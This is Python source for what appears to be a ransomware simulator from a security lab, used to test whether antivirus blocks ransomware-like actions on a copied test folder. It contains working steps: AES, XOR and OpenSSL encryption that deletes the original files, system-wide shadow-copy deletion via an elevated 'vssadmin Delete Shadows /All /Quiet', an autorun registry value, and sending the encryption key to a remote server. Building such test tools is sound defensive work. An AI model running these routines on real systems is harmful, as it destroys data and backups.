
# NioCryptoSimulator
# by NioGuard Security Lab, (c)2017
# Author: Alexander Adamov
# Email: ada@nioguard.com
# Version 1.0

import os, sys, ctypes
import shutil
import win32com.shell.shell as shell
import win32event, win32api, win32process
import hashlib
import filecmp
import requests
from array import *
from Crypto.Cipher import *
from _winreg import *
import gzip

DEBUG = False # True: do not delete target files and reg values after test

TESTS = [
            'ENCRYPT_TO_NEW_FILE',
            'ENCRYPT_AND_REPLACE',
            'ENCRYPT_SAFE_DELETE',
            'ENCRYPT_HTTP',
            'ENCRYPT_TO_STREAM',
            'ARCHIVE', # shouldn't be blocked
            'REMOVE', # shouldn't be blocked
            'REPLACE',
            'MOVE', # shouldn't be blocked
            'ENCRYPT_XOR',
            'LOCKY',
            'THOR',
            'NEMUCOD',
            'VAULTCRYPT',
            'DELETE_SHADOWS',
            'ENCRYPT_CRYPTOAPI',
            'ENCRYPT_GPG',
            'ENCRYPT_OPENSSL'
        ]

TEST_FILES_LOCATION = os.getcwd() + "\\CryptoSimTest\\"
ENCRYPT_LOCATION = "%s\\Documents\\CryptoSimTest\\" % os.environ['USERPROFILE']

EXTENSIONS = [
                ".pptx",
                ".txt",
                ".zip",
                ".7z",
                ".png",
                ".mp4",
                ".pdf",
                ".docx",
                ".html"
             ]

ENC_EXT = ""
AES_KEY = "9c9e1ba2ee5b86494b7e1ebba6420ee6ab64ce6d678604eb5b5049b210693743"
IV = "9fa4ed4d89b04ee7f3b74c9b46588e18"
PASSWORD = "niocryptosim"
XOR_KEY_LENGTH = 255 # XOR key length in bytes
TARGET_URL = "http://nas.nioguard.com/test"
RESULTSFILE = os.getcwd() + "\\results.txt"

bError = False

def copy_test_files():
    try:
        os.stat(ENCRYPT_LOCATION)
    except:
        os.mkdir(ENCRYPT_LOCATION) 
    try:
        for filename in os.listdir(TEST_FILES_LOCATION):
            shutil.copy(TEST_FILES_LOCATION + filename, ENCRYPT_LOCATION)
    except Exception, e:
        raise

def verify_files_integrity():
    count_modified = count_all = 0
    for original_file in os.listdir(TEST_FILES_LOCATION):
        count_all += 1
        encrypted_location_files = 0
        modified_flag = True
        for encrypted_file in os.listdir(ENCRYPT_LOCATION):
            encrypted_location_files += 1
            if (original_file == encrypted_file) or ((original_file + ENC_EXT) == encrypted_file):
                if filecmp.cmp(TEST_FILES_LOCATION + original_file, ENCRYPT_LOCATION + encrypted_file) == True:
                    modified_flag = False
                    break
        if modified_flag == True:
            count_modified += 1

    
    if encrypted_location_files < count_all: # the number of files is not the same - files were deleted (MOVE, ENCRYPT_STREAM, ARCHIVE)
        count_modified = count_all
    print "Files integrity verification: %d files out of %d have been modified" % (count_modified, count_all)
    if count_modified == 0:
        return True # no files have been modified

    return False # 1 or more files have been modified

def hex_to_byte(data): 
    return array('B', data.decode('hex')).tostring()

def run_as_admin(file, params):
    #SEE_MASK_NO_CONSOLE = 0x00008000
    SEE_MASK_NOCLOSEPROCESS = 0x00000040
    SHOWNORMAL = 1
    procInfo = shell.ShellExecuteEx(lpVerb='runas', lpFile=file, lpParameters=params, nShow=SHOWNORMAL, fMask = SEE_MASK_NOCLOSEPROCESS)
    procHandle = procInfo['hProcess']    
    obj = win32event.WaitForSingleObject(procHandle, win32event.INFINITE)
    rc = win32process.GetExitCodeProcess(procHandle)
    print "Process handle %s returned code %s" % (procHandle, rc)
    return rc

def add_registry_key():
    ret_status = True
    test_value = "Test value created by NioCryptoSim to be deleted."
    try:
        with OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS) as key:
             SetValueEx(key, "NioCryptoSim", 0, REG_SZ, test_value)
             res2 = QueryValueEx(key, "NioCryptoSim")
             if res2[0] != test_value:
                ret_status = False
    except:
        print "ERROR: Can't create a value in the registry!"
        ret_status = False

    return ret_status


def delete_registry_key():
    try:
        with OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS) as key:
             DeleteValue(key, "NioCryptoSim")
    except:
        print "ERROR: Can't delete a value from the registry!"


def create_restore_point():
    global bError
    print "Verifying if system protection is on ..."
    with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", 0, KEY_READ) as key:
        res = QueryValueEx(key, "RPSessionInterval")
        if res[0] == 0:
            print "ERROR: Turn on system protection and run test again!"
            bError = True
        else:
            print "Success.\nCreating a restoration point ..."
            rprc = run_as_admin("wmic.exe", "/Namespace:\\\\root\\default Path SystemRestore Call CreateRestorePoint \"TestPoint\", 100, 7")
            if rprc != 0:
                bError = True
            else:
                print "Success."

def delete_shadows():
    # vssadmin.exe Delete Shadows /All /Quiet
    print "Deleting shadows copies ..."
    rc1 = run_as_admin("vssadmin", "Delete Shadows /All /Quiet")
    if rc1 == 0:
        print "Success!\nVerifying available shadow copies ..."
        rc2 = run_as_admin("vssadmin", "Delete Shadows /All /Quiet")
        if rc2 == 1:
            print "Not found!"
            return True
    return False;

def encrypt_openssl(filepath):
    print "Encrypting %s ..." % filepath
    outputfile = filepath + ENC_EXT;
    cmd_status = os.system("openssl aes-256-cbc -e -in %s -out %s -pass pass:%s" % (filepath, outputfile, PASSWORD))
    if cmd_status != 0:
        print "ERROR: Error executing OpenSSL"
        #bError = True
    else:
        os.remove(filepath)
    return cmd_status


def aes_encrypt_file(in_file, out_file):
    print "Encrypting %s..." % in_file.name
    block_size = AES.block_size # 16
    cipher = AES.new(hex_to_byte(AES_KEY), AES.MODE_CBC, hex_to_byte(IV))
    out_data = 'NioGuard CryptoSimulator: testing AES.MODE_CBC encryption (KEY:%s, IV:%s)' % (AES_KEY, IV) # write the key and iv as a file header
    endoffile = False
    while not endoffile:
        block = in_file.read(1024 * block_size)
        if len(block) == 0 or len(block) % block_size != 0:
            padding_length = (block_size - len(block) % block_size) or block_size
            block += padding_length * chr(padding_length)
            endoffile = True
        out_data+=cipher.encrypt(block)
    out_file.seek(0)
    try:
        out_file.write(out_data) #dump encrypted content to the output file
    except:
        print "ERROR: Can't write to file!"

def connect_to_http():
    data = "AES_KEY=%s" % AES_KEY
    h = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate",
    }
    return requests.post(TARGET_URL, data=data, headers=h)

def encrypt_to_new_file(filepath):
    with open(filepath, 'rb') as file_in, open(filepath + ENC_EXT, 'wb') as file_out:
        aes_encrypt_file(file_in, file_out)
        file_in.close()
        file_out.close()
        os.remove(filepath)

def encrypt_cryptoapi(folderpath):
    #global bError
    print "Encrypting %s ..." % folderpath
    cmd_status = os.system("CryptoAPISim.exe -e %s %s" % (folderpath, ENC_EXT))
    if cmd_status != 0:
        print "ERROR: Error executing CryptoAPISim.exe"
        #bError = True
    #else:
    #    os.remove(filepath)
    return cmd_status

def xor_encrypt_file(in_file, out_file, key, encrypt_block_length):
    print "XORing %s..." % in_file.name
    data_in = in_file.read()
    key_length = len(key)
    if encrypt_block_length == 0:
        encrypt_block_length = len(data_in)
    else:
        encrypt_block_length = min(encrypt_block_length, len(data_in))

    out_data = "CryptoSimulator: testing XOR cipher."
    for i in range (0, len(data_in)):
        if i < encrypt_block_length:
            out_data += chr(ord(data_in[i]) ^ ord(key[i % key_length]))
        else:
            out_data+=data_in[i]
    out_file.write(out_data)

def generate_xor_key(length):
    xor_key = ""
    for i in range (0, length):
        xor_key += chr(i)
    return xor_key

def encrypt_xor(filepath, key_length, encrypt_block_length=0):
    with open(filepath, 'rb') as file_in, open(filepath + ENC_EXT, 'wb') as file_out:
        xor_encrypt_file(file_in, file_out, generate_xor_key(key_length), encrypt_block_length)
        file_in.close()
        file_out.close()
        os.remove(filepath)

def http_post():
    try:
        print connect_to_http()
        return True
    except:
        print "ERROR: Can't connect to the remote server"
        return False

def encrypt_and_replace(filepath):
    with open(filepath, 'r+b') as file_in_out:
        aes_encrypt_file(file_in_out, file_in_out)
        file_in_out.close()

def archive_gzip(filepath):
    print "Archiving %s ..." % filepath
    with open(filepath, 'rb') as file_in, gzip.open(filepath + ".gz", 'wb') as file_out:
        file_out.write(file_in.read())
        file_in.close()
        file_out.close()
        os.remove(filepath)

def replace(filepath):
    print "Replacing %s ..." % filepath
    with open(filepath, 'wb') as file_out:
        file_out.write("The file content has been succesfully replaced")
        file_out.close()

def encrypt_to_stream (filepath, stream): 
    with open(filepath, 'rb') as file_in: 
        stream.write(file_in.read())
        file_in.close()
        os.remove(filepath)


def run_test_payload(test_type):
    print "Preparing ..."
    #pre-procecessing
    http_status = False # True - a connection is successful, False - a connection hasn't been established
    final_status = False # True - ALLOWED (the scenario hasn't been blocked), False - BLOCKED (the scenario has been blocked by AV)
    stream_status = False # True - data were streamed into the file and the file was encrypted, False - the stream file cannot be read
    cmd_status = 0 # !0 - command failed , 0 - command succeded
    registry_status = False # True - a registry value was succesfully added to the autorun key, False - otherwise

    global bError
    global ENC_EXT
    if test_type == 'ARCHIVE':
        ENC_EXT = ".gz"
    elif test_type == 'LOCKY':
        ENC_EXT = ".locky"
    elif test_type == 'THOR':
        ENC_EXT = ".thor"
    elif test_type == 'VAULTCRYPT':
        ENC_EXT = ".vault"
    else:
        ENC_EXT = ".cryptosim"

    stream_file_path = ENCRYPT_LOCATION + "cryptosim.stream"
    move_folder_path = ENCRYPT_LOCATION + "..\\OtherFolder\\"
    if  test_type == 'ENCRYPT_TO_STREAM':
        stream_file_out = open(stream_file_path, 'wb')
    if test_type == 'MOVE':
        try:
            os.stat(move_folder_path)
        except:
            print "Creating move folder %s" % move_folder_path
            os.mkdir(move_folder_path) # creat ../OtherFolder/ to move files

    if test_type in ['DELETE_SHADOWS', 'LOCKY', 'THOR']:
        create_restore_point()

    
    print "Start testing ..."
    
    # process test files
    if test_type not in ['ENCRYPT_CRYPTOAPI', 'LOCKY', 'THOR', 'VAULTCRYPT']:
        for root, dirs, files in os.walk(ENCRYPT_LOCATION):
            for file in files:
                if bError == False:
                    for ext in EXTENSIONS:
                        if file.endswith(ext):
                            fullpath = os.path.join(root, file)
                            if test_type in ['ENCRYPT_TO_NEW_FILE', 'ENCRYPT_SAFE_DELETE', 'ENCRYPT_HTTP']:         
                                encrypt_to_new_file(fullpath)
                            if  test_type == 'ENCRYPT_AND_REPLACE':
                                encrypt_and_replace(fullpath)
                            if  test_type == 'ARCHIVE':    
                                archive_gzip(fullpath)
                            if  test_type == 'REMOVE':              
                                print "Removing %s..." % fullpath
                                os.remove(fullpath)
                            if  test_type == 'REPLACE':
                                replace(fullpath)
                            if  test_type == 'ENCRYPT_TO_STREAM':  
                                encrypt_to_stream(fullpath, stream_file_out)
                            if test_type == 'MOVE':
                                print "Moving %s..." % fullpath
                                shutil.move(fullpath, move_folder_path)
                            if test_type == 'ENCRYPT_XOR':
                                encrypt_xor(fullpath, XOR_KEY_LENGTH)
                            if test_type == 'NEMUCOD':
                                encrypt_xor(fullpath, XOR_KEY_LENGTH, 2048)
                            if test_type == 'ENCRYPT_OPENSSL':
                                encrypt_openssl(fullpath)
                        
    # post-processing    
    if test_type == 'ENCRYPT_CRYPTOAPI':
        cmd_status = encrypt_cryptoapi(ENCRYPT_LOCATION)
    if test_type in ['LOCKY', 'THOR']:
        cmd_status = encrypt_cryptoapi(ENCRYPT_LOCATION)

    if test_type in ['ENCRYPT_HTTP', 'LOCKY', 'THOR']:
        print "Sending the key to a remote server ..."
        http_status = http_post()

    if  test_type == 'ENCRYPT_SAFE_DELETE':
        cmd_status = os.system("startcmd.bat cipher.exe /w:%s" % ENCRYPT_LOCATION)
        if cmd_status != 0:
            bError = True

    if  test_type == 'ENCRYPT_TO_STREAM':
        stream_file_out.close()
        encrypt_and_replace(stream_file_path)
        try:
           stream_file_out = open(stream_file_path, 'rb')
           if len(stream_file_out.read()) > 0:
                stream_status = True
        except Exception, e:
            print "ERROR: The stream file %s cannot be read" % stream_file_path
            raise

    if test_type == 'MOVE':
        if DEBUG == False:
            clean_test_folder(move_folder_path)
            os.rmdir(move_folder_path)

    if test_type in ['DELETE_SHADOWS', 'LOCKY', 'THOR']:
        if bError == False:
            shadow_status = delete_shadows()
        else:
            print "ERROR: Error happened when preparing the test. Shadows won't be deleted."

    if test_type in ['LOCKY', 'THOR']:
        registry_status = add_registry_key()

    if test_type == 'VAULTCRYPT':
         cmd_status = os.system("run_vaultcrypt.bat %s" % ENCRYPT_LOCATION)

    if test_type == 'ENCRYPT_GPG':
         cmd_status = os.system("run_gpg.bat %s" % ENCRYPT_LOCATION)   

    # calculate the final test status
    if test_type not in ['DELETE_SHADOWS']:
        if verify_files_integrity() == False: # the test files have been modified
            if (
                (test_type == 'ENCRYPT_HTTP' and http_status == True) # succesful conection
                or (test_type in ['ENCRYPT_SAFE_DELETE', 'VAULTCRYPT', 'ENCRYPT_GPG', 'ENCRYPT_CRYPTOAPI'] and cmd_status == 0) #succesfull cmd run
                or (test_type in ['LOCKY', 'THOR'] and shadow_status == True and cmd_status == 0 and registry_status == True) # files have been encrypted and shadow copies have been deleted
                or (test_type == 'ENCRYPT_TO_STREAM' and stream_status == True) #stream file was created, encrypted, and can be read
                or (test_type != 'ENCRYPT_HTTP' and test_type != 'ENCRYPT_SAFE_DELETE' and test_type != 'ENCRYPT_TO_STREAM')
                ): 
                    final_status = True
    
    if (test_type == 'DELETE_SHADOWS' and shadow_status == True): #succesfull cmd run
       final_status = True

    return final_status


def clean_test_folder(folder):
    try:
        for filename in os.listdir(folder):
            os.remove(folder + filename)

    except Exception, e:
        raise

def print_to_results(message):
    with open(RESULTSFILE, 'a') as file_out:
        file_out.write(message)
        file_out.close()

def erase_results():
    with open(RESULTSFILE, 'w') as file_out:
        file_out.write("")
        file_out.close()

def start_test(test):
    try:
        global bError
        bError = False
        print "Copying test files ..."
        copy_test_files()
        strTestName = "============%s============" % test
        print strTestName
        print_to_results(strTestName)
        ret_status = run_test_payload(test)
        
        strError = "============ERROR============"
        strSuccess = "============ALLOWED============"
        strBlocked = "============BLOCKED============"
        strResult = ""
        if bError == True:
            strResult = strError # the scenario has been successfully executed
        elif ret_status == True:
            strResult = strSuccess # the scenario has been successfully executed
        else:
            strResult = strBlocked # the scenario has been blocked

        print strResult
        strResult += "\n"
        print_to_results(strResult)

        if DEBUG == False:
            if test not in ['DELETE_SHADOWS']:
                print "Cleaning the test folder ..."
                clean_test_folder(ENCRYPT_LOCATION)

            if test in ['LOCKY', 'THOR']:
                print "Deleting the registry value ..."
                delete_registry_key()

    except (KeyboardInterrupt, SystemExit):
        raise
        print "Closing ..."
        sys.exit()
    except Exception, e:
        raise

if __name__ == '__main__':
    print "CryptoSimulator by NioGuard Security Lab, 2017"
    input_test_name = ''
    if len(sys.argv) == 2:
        input_test_name = sys.argv[1]
        arg_correct = False
        for test in TESTS:
            if test == input_test_name:
                arg_correct = True
                break
        if arg_correct == False:
            print "ERROR: There is no test: %s" % input_test_name
            sys.exit()

    #erase_results()

    if input_test_name == '': # run all tests
        for test in TESTS:
            start_test(test)
    else:
        start_test(input_test_name) # run the specificed test

    print "Testing is done!"

